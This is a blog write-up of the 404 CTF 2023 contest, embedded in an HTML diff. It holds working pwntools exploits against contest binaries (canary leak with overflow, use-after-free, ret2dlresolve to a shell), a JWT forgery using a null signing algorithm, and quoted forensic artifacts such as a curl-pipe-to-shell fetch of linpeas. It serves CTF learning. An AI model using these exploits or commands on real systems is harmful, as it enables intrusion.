@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>404 CTF 2023 | Luhko</title>
+<meta name="keywords" content="">
+<meta name="description" content="Pwn La cohue Let’s perform a checksec on the binary:
+$ checksec la_cohue [*] &#39;./la_cohue&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled **PIE: No PIE (0x400000)** We can see that a canary is set, but no PIE.
+Looking at the decompiled code below, we can identify that:
+ Once we have used option 1, we cannot use it anymore (no more user input, because of a boolean flag set to true) Once we have used option 2, we cannot use it anymore (no more user input, because of a boolean flag set to true)  Our goal is to call the function canary() which is unreachable to get the flag.">
+<meta name="author" content="">
+<link rel="canonical" href="https://luhko.github.io/write-up/404ctf2023/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d7fb4cbf980fe688a21621b06a795933c4e6bb2d4070ec940667af1715d84af2.css" integrity="sha256-1/tMv5gP5oiiFiGwanlZM8Tmuy1AcOyUBmevFxXYSvI=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://luhko.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://luhko.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://luhko.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://luhko.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://luhko.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="404 CTF 2023" />
+<meta property="og:description" content="Pwn La cohue Let’s perform a checksec on the binary:
+$ checksec la_cohue [*] &#39;./la_cohue&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled **PIE: No PIE (0x400000)** We can see that a canary is set, but no PIE.
+Looking at the decompiled code below, we can identify that:
+ Once we have used option 1, we cannot use it anymore (no more user input, because of a boolean flag set to true) Once we have used option 2, we cannot use it anymore (no more user input, because of a boolean flag set to true)  Our goal is to call the function canary() which is unreachable to get the flag." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://luhko.github.io/write-up/404ctf2023/" /><meta property="article:section" content="write-up" />
+<meta property="article:published_time" content="2023-06-04T21:44:49&#43;02:00" />
+<meta property="article:modified_time" content="2023-06-04T21:44:49&#43;02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="404 CTF 2023"/>
+<meta name="twitter:description" content="Pwn La cohue Let’s perform a checksec on the binary:
+$ checksec la_cohue [*] &#39;./la_cohue&#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled **PIE: No PIE (0x400000)** We can see that a canary is set, but no PIE.
+Looking at the decompiled code below, we can identify that:
+ Once we have used option 1, we cannot use it anymore (no more user input, because of a boolean flag set to true) Once we have used option 2, we cannot use it anymore (no more user input, because of a boolean flag set to true)  Our goal is to call the function canary() which is unreachable to get the flag."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Write-ups",
+      "item": "https://luhko.github.io/write-up/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "404 CTF 2023",
+      "item": "https://luhko.github.io/write-up/404ctf2023/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "404 CTF 2023",
+  "name": "404 CTF 2023",
+  "description": "Pwn La cohue Let’s perform a checksec on the binary:\n$ checksec la_cohue [*] \u0026#39;./la_cohue\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled **PIE: No PIE (0x400000)** We can see that a canary is set, but no PIE.\nLooking at the decompiled code below, we can identify that:\n Once we have used option 1, we cannot use it anymore (no more user input, because of a boolean flag set to true) Once we have used option 2, we cannot use it anymore (no more user input, because of a boolean flag set to true)  Our goal is to call the function canary() which is unreachable to get the flag.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Pwn La cohue Let’s perform a checksec on the binary:\n$ checksec la_cohue [*] './la_cohue' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled **PIE: No PIE (0x400000)** We can see that a canary is set, but no PIE.\nLooking at the decompiled code below, we can identify that:\n Once we have used option 1, we cannot use it anymore (no more user input, because of a boolean flag set to true) Once we have used option 2, we cannot use it anymore (no more user input, because of a boolean flag set to true)  Our goal is to call the function canary() which is unreachable to get the flag.\nSo our goal will be to :\n Leak the canary() function adress locally. It will not change remotly since PIE is not enabled. Leak the canary value using format string vulnerability. We need to take the choice 2 and then input %p 17 time in order to leak it. We can recognize it because its value ends with 00. It is vulnerable because printf() uses the user input directly. Buffer overflow using the choice 1, because of the inscure use of gets()function.  Fill the buffer with 72 bytes Write the canary in order to bypass the security Write 8 random bytes to overwrite ebp Overwrite eip to return to canary() at the end of the function   Take choice 3 to use our eip that lead to canary()  All put together, we can use the script bellow:\nfrom pwn import * ''' payload = buffer + canary + ebp + eip We can break on the value bellow in GDB to check the stack value b* 0x0000000000400a39 ''' addr = \"challenges.404ctf.fr\" port = 30223 p = remote(addr,port) p.recvuntil(\"\") p.sendline(b\"2\") p.sendline(b\"%p\"*17) # leak canary leak = str(p.recvline())[-21:] leaked_canary = leak[:-3] print(\"Leaked canary value\", leaked_canary) flag_fct = 4196471 # elf.symbols['canary'] print(\"Leaked canary function \", flag_fct) payload = b\"\" payload += cyclic(72) payload += p64(int(leaked_canary,16)) payload += cyclic(8) payload += p64(flag_fct)# return here p.sendline(b\"1\") p.recvuntil(\"[Vous] :\") p.sendline(payload) p.interactive() We execute our exploit and we get the flag!\n$ python3 canary.py [+] Opening connection to challenges.404ctf.fr on port 30223: Done Leaked canary value 0x4f70c3267c091900 Leaked canary function 4196471 [*] Switching to interactive mode [Francis] : Je vous laisse mettre votre plan à éxécution. Que faites-vous ? 1 : Aller voir Francis 2 : Réfléchir à un moyen de capturer le canari 3 : Vaquer à vos occupations  $ 3 Je vous suis infiniment reconnaissant d'avoir retrouvé mon canari. 404CTF{135_C4N4r15_41M3N7_14_C0MP46N13_N3_135_141553Z_P45_53U15} L’alchimiste Let’s perform a checksec on the binary:\n$ checksec ./l_alchimiste [*] './l_alchimiste' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled **PIE: No PIE (0x400000)** Again, a canary and no PIE.\nAt launch, we have 50 INT, 100 FO and 100 OR. We can buy a potion with 50 OR and it increase our FO by 10, but it is not enough: we need 150 FO and 150 INT to get the flag (option 5).\nPlaying a little bit with GDB, we can use vis_heap_chunks to check to display the heap chunks. We can quickly identify that there is a use after free vulnerability (UAF) because if we buy a potion and that we use it, the pointer is not set to null after the call to free(). Therefore, the content allocated in the heap with option 3 will take place in Potion structure (they have the same size). The Potion structure contains the function incStr adress that allow the player to increase its FO.\nWe can confirm it because Option 1,2,3 gives us the adress of the data in the heap:\n...  1 ***** Achat d'un élixir de force ******* ~ 0x6036d0** ...  2 ***** Elixir consommé ***** Vous sentez votre force augmenter. ******* ~ 0x6036d0** ...  3 [Vous] : whatever lol ******* ~ 0x6036d0 ^ | UAF** Using this vulnerability, we can quickly see that we just need to use the option 3 to allocate random data into the heap, then the function 2 will work because of the UAF vulnerability. So we can increase our FOR for free.\nBut how do we increase our INT?\nIf we look at the code in Ghidra, we can see that there is a function incInt() which is never used. This function could allow us to increase our INT, but to achieve that, we need to overwrite the previous function pointer in the Potion structure.\nSo, we need to:\n Buy a potion (1) and use it (2) Speak (3) and input random data (even an empty buffer) to trigger the UAF, and then use (2) to increase FO. We can repeat this 10 time for example. Create a custom buffer with 64 random bytes + the incInt function adress (we can get it with pwntools) Speak (3) and use our custom buffer as input, and then use (2) to increase INT (Optionnal) Check our stats (4) Get the flag with (5)  from pwn import * addr = \"challenges.404ctf.fr\" port = 30944 p = remote(addr,port) #elf = ELF(\"./l_alchimiste\") # Buy our only leggit potion to trigger the UAF p.recvuntil(\"\") p.sendline(b\"1\") p.recvuntil(\"\") p.sendline(b\"2\") # Increase FO for i in range(0,10): p.recvuntil(\"\") p.sendline(b\"3\") p.recvuntil(\"[Vous] :\") p.sendline(b\"\") p.recvuntil(\"\") p.sendline(b\"2\") # Increase INT by overwriting function pointer in our UAF vulnerability create_potion = b\"\\x00\"*64 create_potion += p64(4196565) #elf.symbols['incInt'] for i in range(0,10): p.recvuntil(\"\") p.sendline(b\"3\") p.recvuntil(\"[Vous] :\") p.sendline(create_potion) p.recvuntil(\"\") p.sendline(b\"2\") p.interactive() # Type 4 and get the flag We can then execute our script and get the flag:\n$ python3 pwned.py [+] Opening connection to challenges.404ctf.fr on port 30944: Done [*] Switching to interactive mode ***** Elixir consommé ***** Vous sentez votre force augmenter. ***** ~ 0x14ec290 1: Acheter un élixir de force 2: Consommer un élixir de force 3: Parler à l\\'alchimiste 4: Montrer mes caractéristiques 5: Obtenir la clé 6: Sortir du cabinet d\\'alchimie  $ 4 Voici une estimation numérique de vos caractéristiques: FOR: 310 INT: 250 OR: 50 1: Acheter un élixir de force 2: Consommer un élixir de force 3: Parler à l\\'alchimiste 4: Montrer mes caractéristiques 5: Obtenir la clé 6: Sortir du cabinet d'alchimie  $ 5 [Alchimiste] : Voici la clé de la connaissance, comme promis. ----------------------------------------------- 404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7} ----------------------------------------------- La feuille blanche We were given this binary:\n$ checksec ./la_feuille_blanche [*] 'la_feuille_blanche' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) We can see that there is no canary and no PIE. If we execute the program, we can input something, then the message end. If we input a big message, then we have a Segmentation fault.\nLooking at the code in Ghidra, here is the only interresting code (the program is pretty much empty, no magic function for us!). We can see a buffer overflow because read() is reading more bytes than the buffer capacity:\nSo, it’s a buffer overflow. We can execute it locally a do a basic ret2libcby getting the adresses in GDB, but the problem is that the remote library has different ones: we need another way. We could think of a ROP chain to leak the base adress, but again, the function is not printing anything… So at this point, I was a bit out of idea.\nLooking around on the internet, we can find this blogpost, speaking ret2dlresolve.\nWe can find the offset to trigger the BoF:\n$ cyclic -n 4 70 | ./la_feuille_blanche Segmentation fault $ sudo dmesg | tail -n 10 [26222.310779] CPU: 6 PID: 12461 Comm: la_feuille_blan Not tainted 5.15.90.1-microsoft-standard-WSL2 #1 [26222.311089] RIP: 0023:0x61616169 $ cyclic -n 4 -l 0x61616169 32 And flag with pwntools:\nfrom pwn import * addr = \"challenges.404ctf.fr\" port = 31822 context.update(os='linux') p = remote(addr,port) e = ELF('./la_feuille_blanche') rop = ROP(e) dlresolve = Ret2dlresolvePayload(e, symbol='system', args=['/bin/sh']) rop.raw('A' * 32) rop.read(0, dlresolve.data_addr) rop.ret2dlresolve(dlresolve) p.sendline(rop.chain()) p.sendline(dlresolve.payload) p.interactive() p.close() $ python3 exploit.py [+] Opening connection to challenges.404ctf.fr on port 31822: Done Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) [*] Loaded 10 cached gadgets for './la_feuille_blanche' [*] Switching to interactive mode $ ls flag.txt la_feuille_blanche $ cat flag.txt 404CTF{3MM4_80V4rY_357_UN3_F3MM3_C0MP11QU33_M415_V0U5_4V3Z_r3U551_4_14_C0N5013r_3N_1U1_F4154N7_M1r0173r_C3_QU3113_V0U1417} Un tour de magie We have this binary:\n$ nc challenges.404ctf.fr 30274 11a20Alors, t'es un magicien ? Nop Apparemment non... We can write 24 bytes, then write the 4 bytes given at the beginning (otherwise we will have an error from wasm), then we write the bytes needed to get the flag.\nfrom pwn import * addr = \"challenges.404ctf.fr\" port = 30274 p = remote(addr,port) p.recvuntil(\"magicien ?\") base_payload = b\"\\x00\"*24 # size = 24 base_payload += p32(0x11a20)+p32(0x50bada55)*8 p.sendline(base_payload) p.interactive() Web L’Académie du détail We had a website with nothing but a landing page and an authentication page. We can auth as any user if he does not exist, but admin does. A JWT is set with the username in it, and being logged in gives us a new page, /members, but we cannot view its content since we are not admin. But if we set the JWT signing algorithm to null and change value of username to admin, then we can access /members : we have a picture and a name (but nothing really interesting at first).\nIf we upload the image on aperisolve, we can spot LSB in the upper left corner:\nWe can get the flag using stegonline:\nFuite en 1791 A bit random, but we need to provire an expiration date with a valid signature. The original one has a valid signature but the timestamp is not valid anymore. What if we try to use it, but then we add another expiry date?\nSteganography Odobenus Rosmarus We were given a text. It look like Acrostiches, but nothing comes out from when you try to decode it the regular way. Since the name of the challenge is Odobenus Rosmarus (== morse) , we can guess that we have C == Court == short, L == Long, and E == Espace == space:\ncoded= \"Ce soir je Célèbre Le Concert Electro Comme Louis Et Lou. Comme La nuit Commence Et Continue Clairement, Et Clignote Lascivement il Chasse sans Chausser En Clapant Encore Classiquement Les Cerclages du Clergé. Encore Car Encore, Louis Lou Entamant Longuement La Lullabile En Commençant Le Cercle Exhaltant de Club Comique Cannais Et Clermontois.\" extract = \"\" for i in range(0,len(test)): if(test[i] == \"C\"): extract += \".\" elif(test[i] == \"L\"): extract += \"_\" elif(test[i] == \"E\"): extract += \" \" print(extract) Which gives us:\n.._. ._ _._. .. ._.. . ._.. . __ ___ ._. ... . The flag is 404CTF{FACILELEMORSE}\nL’Œuvre Were were given this image:\nIn the challenge description, they say that “there is colour variation”. Using aperisolve, we can get the flag:\nReverse Le Divin Crackme We were given an ELF binary. We need to provide the compiler used, the function used to verify the password, and the password. Using Ghidra, we can get the password and the function used:\nAnd we can verify the password:\n$ ./divin-crackme Mot de passe ? : L4_pH1l0soPh13_d4N5_l3_Cr4cKm3 Bien joué ! Tu aurais été libre, pour cette fois... If we strings, we can have the compiler: GCC: (Debian 12.2.0-14) 12.2.0\nThe flag is:\n404CTF{gcc:strncmp:L4_pH1l0soPh13_d4N5_l3_Cr4cKm3}\nL’inspiration en images We were given a pretty fun binary which is displaying a Canva. Our goal is to find the exact colors used for the background.\nIf we search online for the functions that are displayed in Ghidra, we can see that OpenGL is used. So let’s find out how to change the background color. We can find the answer here and thus look for it in Ghidra.\nOnce we find it, we can edit the function signature to match the real one, and we get the flag:\n404CTF{vec3(0.2,0.3,0.3,1.0)}\nOSINT Le tour de France We were given an image. We need to find the coordinates of those panels:\nIf we search for Beaune Saint Nicolas we can find something interesting, because we can see A6/E15/E21:\nGoing in street view, we can find the panels, and the coordinates are in the URL.\nMention gastro Given a name, we had to find where Margot Paquet ate and how much she paid at the restaurant. Looking at the usual social media, Instragram gives us a good touch:\nThere are some food images, and she is indentified by an account futurionix:\nIf we take a look at this account, we can find this picture:\nUsing google lens, we can find the name of the bridge: Pont Royal. There is a restaurant in front of the bridge, named La Frégate:\nAlright, now we need to find out what she ate in this restaurant. Back to her instagram, she said that she ate a Tarte Tatin yesterday, as well as a boeuf bourguignon:\nIf we look for the prices on Google, they seems to be erroned (on thefork or tripadvisor for example). But if we look for the prices on our phone, Google is giving us the good prices: 15.5€ and 8.5€. The flag is: 404CTF{la_fregate_24.0}\nForensics Pêche au livre We were given a pcapng file which contains TCP and HTTP packets. We can extract HTTP objects using Wireshark:\nIn one of the pictures, there is the flag:\nLes Mystères du cluster de la Comtesse de Ségur [1/2] We were given a kubernetes cluster zip file. Using strings, we can find some nasty things, like linpeas or known exploit:\n$ strings * | grep github.com strings: Warning: 'checkpoint' is a directory [7mcurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh root@bash:/# curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh [1;31mhttps://github.com/sponsors/carlospolop 2023-05-12T09:01:38.816404524+00:00 stdout P curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh [1;31mhttps://github.com/sponsors/carlospolop [3mhttps://github.com/mzet-/linux-exploit-suggester  Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main Looking a little bit deeper, we find pages-1.img:\n$ strings -n 8 checkpoint/pages-1.img ... curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh KUBERNETES_PORT=tcp://10.96.0.1:443 #1683882102 /usr/bin/apt agent.zip flag.txt curl agent.challenges.404ctf.fr -o agent.zip ... agent.challenges.404ctf.fr looks interesting:\n$ curl agent.challenges.404ctf.fr -o agent.zip Le Mystère du roman d’amour We were given a vim swap file. We need to find many things to flag: the PID, the username, the path of the file, the machine name, and the lost content.\nUsing file, we can get :\n The PID (168) The username (jaqueline) The path (~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt)  $ file fichier-etrange.swp fichier-etrange.swp: Vim swap file, version 7.4, pid 168, user jaqueline, host aime_ecrire, file ~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt With strings, we can find the machine name:\n$ strings -n 10 fichier-etrange.swp ... aime_ecrire ... If we open the swp file using the recovery mode, we can see that it is an image (because of the %PNG at the beginning of the file). So we can save it out:\n$ vim -r fichier-etrange.swp :w out.png If we submit it in aperisolve, we can find a QR code which contains the end of te flag:\nThe full flag is:\n404CTF{168-~jaqueline/Documents/Livres/404 Histoires d'Amour pour les bibliophiles au coeur d'artichaut/brouillon.txt-jaqueline-aime_ecrire-3n_V01L4_Un_Dr0l3_D3_R0m4N} Lettres volatiles We have a Windows User folder. Nothing really interesting here but a zip file (password protected) and a memory dump:\nWe can use volatility to identify the profile:\n .\\Volatility.exe -f .\\C311M1N1-PC-20230514-200525.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418 We are lucky, it’s a common profile and not a weird one. If we use basic commands such as cmdline or pstree nothing interesting comes out (excepted a notepad). But the clipboard command is quite interesting …\n .\\Volatility.exe -f .\\C311M1N1-PC-20230514-200525.raw --profile=Win7SP1x64 clipboard Volatility Foundation Volatility Framework 2.6 Session WindowStation Format Handle Object Data ---------- ------------- ------------------ ------------------ ------------------ -------------------------------------------------- 1 WinSta0 CF_UNICODETEXT 0x1801b1 0xfffff900c23fa100 Z1p p4s5wOrd : F3eMoBon8n3GD5xQ 1 WinSta0 CF_TEXT 0x10 ------------------ 1 WinSta0 0x120207L 0x200000000000 ------------------ 1 WinSta0 CF_TEXT 0x1 ------------------ 1 ------------- ------------------ 0x120207 0xfffff900c2108b60 Using this password, we can then extract the PDF and get the flag:\nWeb3 L’antiquaire, tête en l’air In this challenge, we had a file memorandum.txt which contains hexadecimal values. If we decode it, we can find a truncated ipfs link and a shorturl which is pointing to a very interesting url :\nIf we access the ipfs link on ipfd.io, we get a json file with another ipfs link:\nWe get Sepolia (a testnet faucet) and an address. If we look for it, we can find some transactions:\nAnd if we decode the input, we can get the flag\nRadio fréquences Navi We were given a raw file. We can open the file as a raw file in audacity and let it decide the best parameters. If play with the EQ, the speed and that we reverse the sound, a voice is saying the flag in hexadecimal is: 3430344354467b317472305f3455785f52346431302d6652337155334e6333357d\nOnce decoded we get the flag:\n404CTF{1tr0_4Ux_R4d10-fR3qU3Nc35}\nAvez vous vu les cascades du hérisson ? We have again a raw file with 2Mhz sampling frenquency. We can open it with Universal Radio Hacker and display the spectrogram to get the flag:\nThe flag is: 404CTF{413X4NDR3_D4N5_UN3_C45C4D35_?}\n",
+  "wordCount" : "2808",
+  "inLanguage": "en",
+  "datePublished": "2023-06-04T21:44:49+02:00",
+  "dateModified": "2023-06-04T21:44:49+02:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://luhko.github.io/write-up/404ctf2023/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Luhko",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://luhko.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://luhko.github.io/" accesskey="h" title="Luhko (Alt + H)">Luhko</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://luhko.github.io/articles" title="Articles">
+                    <span>Articles</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://luhko.github.io/write-up" title="Write-Up">
+                    <span>Write-Up</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://luhko.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://luhko.github.io/write-up/">Write-ups</a></div>
+    <h1 class="post-title">
+      404 CTF 2023
+    </h1>
+    <div class="post-meta"><span title='2023-06-04 21:44:49 +0200 CEST'>June 4, 2023</span>&nbsp;·&nbsp;14 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#pwn" aria-label="Pwn">Pwn</a><ul>
+                        
+                <li>
+                    <a href="#la-cohue" aria-label="La cohue">La cohue</a></li>
+                <li>
+                    <a href="#lalchimiste" aria-label="L’alchimiste">L’alchimiste</a></li>
+                <li>
+                    <a href="#la-feuille-blanche" aria-label="La feuille blanche">La feuille blanche</a></li>
+                <li>
+                    <a href="#un-tour-de-magie" aria-label="Un tour de magie">Un tour de magie</a></li></ul>
+                </li>
+                <li>
+                    <a href="#web" aria-label="Web">Web</a><ul>
+                        
+                <li>
+                    <a href="#lacad%c3%a9mie-du-d%c3%a9tail" aria-label="L&amp;rsquo;Académie du détail">L&rsquo;Académie du détail</a></li>
+                <li>
+                    <a href="#fuite-en-1791" aria-label="Fuite en 1791">Fuite en 1791</a></li></ul>
+                </li>
+                <li>
+                    <a href="#steganography" aria-label="Steganography">Steganography</a><ul>
+                        
+                <li>
+                    <a href="#odobenus-rosmarus" aria-label="Odobenus Rosmarus">Odobenus Rosmarus</a></li>
+                <li>
+                    <a href="#l%c5%93uvre" aria-label="L&amp;rsquo;Œuvre">L&rsquo;Œuvre</a></li></ul>
+                </li>
+                <li>
+                    <a href="#reverse" aria-label="Reverse">Reverse</a><ul>
+                        
+                <li>
+                    <a href="#le-divin-crackme" aria-label="Le Divin Crackme">Le Divin Crackme</a></li>
+                <li>
+                    <a href="#linspiration-en-images" aria-label="L’inspiration en images">L’inspiration en images</a></li></ul>
+                </li>
+                <li>
+                    <a href="#osint" aria-label="OSINT">OSINT</a><ul>
+                        
+                <li>
+                    <a href="#le-tour-de-france" aria-label="Le tour de France">Le tour de France</a></li>
+                <li>
+                    <a href="#mention-gastro" aria-label="Mention gastro">Mention gastro</a></li></ul>
+                </li>
+                <li>
+                    <a href="#forensics" aria-label="Forensics">Forensics</a><ul>
+                        
+                <li>
+                    <a href="#p%c3%aache-au-livre" aria-label="Pêche au livre">Pêche au livre</a></li>
+                <li>
+                    <a href="#les-myst%c3%a8res-du-cluster-de-la-comtesse-de-s%c3%a9gur-12" aria-label="Les Mystères du cluster de la Comtesse de Ségur [1/2]">Les Mystères du cluster de la Comtesse de Ségur [1/2]</a></li>
+                <li>
+                    <a href="#le-myst%c3%a8re-du-roman-damour" aria-label="Le Mystère du roman d&amp;rsquo;amour">Le Mystère du roman d&rsquo;amour</a></li>
+                <li>
+                    <a href="#lettres-volatiles" aria-label="Lettres volatiles">Lettres volatiles</a></li></ul>
+                </li>
+                <li>
+                    <a href="#web3" aria-label="Web3">Web3</a><ul>
+                        
+                <li>
+                    <a href="#lantiquaire-t%c3%aate-en-lair" aria-label="L’antiquaire, tête en l’air">L’antiquaire, tête en l’air</a></li></ul>
+                </li>
+                <li>
+                    <a href="#radio-fr%c3%a9quences" aria-label="Radio fréquences">Radio fréquences</a><ul>
+                        
+                <li>
+                    <a href="#navi" aria-label="Navi">Navi</a></li>
+                <li>
+                    <a href="#avez-vous-vu-les-cascades-du-h%c3%a9risson-" aria-label="Avez vous vu les cascades du hérisson ?">Avez vous vu les cascades du hérisson ?</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="pwn">Pwn<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h1>
+<h2 id="la-cohue">La cohue<a hidden class="anchor" aria-hidden="true" href="#la-cohue">#</a></h2>
+<p>Let’s perform a <code>checksec</code> on the binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="err">$</span> <span class="n">checksec</span> <span class="n">la_cohue</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;./la_cohue&#39;</span>
+    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
+    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+    <span class="o">**</span><span class="n">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">**</span>
+</code></pre></div><p>We can see that a canary is set, but no PIE.</p>
+<p>Looking at the decompiled code below, we can identify that:</p>
+<ul>
+<li>Once we have used option 1, we cannot use it anymore (no more user input, because of a boolean flag set to true)</li>
+<li>Once we have used option 2, we cannot use it anymore (no more user input, because of a boolean flag set to true)</li>
+</ul>
+<p><img loading="lazy" src="/404CTF2023_data/0.png" alt="Untitled"  />
+</p>
+<p>Our goal is to call the function <code>canary()</code> which is unreachable to get the flag.</p>
+<p>So our goal will be to :</p>
+<ul>
+<li>Leak the <code>canary()</code> function adress locally. It will not change remotly since PIE is not enabled.</li>
+<li>Leak the canary value using format string vulnerability. We need to take the choice <code>2</code> and then input <code>%p</code> 17 time in order to leak it. We can recognize it because its value ends with <code>00</code>. It is vulnerable because <code>printf()</code> uses the user input directly.</li>
+<li>Buffer overflow using the choice <code>1</code>, because of the inscure use of <code>gets()</code>function.
+<ul>
+<li>Fill the buffer with 72 bytes</li>
+<li>Write the canary in order to bypass the security</li>
+<li>Write 8 random bytes to overwrite <code>ebp</code></li>
+<li>Overwrite <code>eip</code> to return to <code>canary()</code> at the end of the function</li>
+</ul>
+</li>
+<li>Take choice 3 to use our <code>eip</code> that lead to <code>canary()</code></li>
+</ul>
+<p>All put together, we can use the script bellow:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
